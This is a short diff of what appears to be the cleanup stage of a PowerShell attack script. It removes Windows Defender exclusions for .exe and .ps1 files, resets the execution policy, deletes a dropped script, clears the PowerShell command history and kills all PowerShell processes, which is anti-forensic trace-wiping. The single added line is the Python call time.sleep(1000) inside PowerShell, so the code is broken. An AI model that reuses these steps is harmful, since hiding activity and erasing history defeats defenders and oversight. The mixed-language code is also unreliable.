@@ -7,5 +7,6 @@ Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception i
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
 Set-ExecutionPolicy restricted -Force #Reset script execution policy
 Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
+time.sleep(1000)
 Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
 taskkill -F /IM powershell.exe #Kill all powershell process
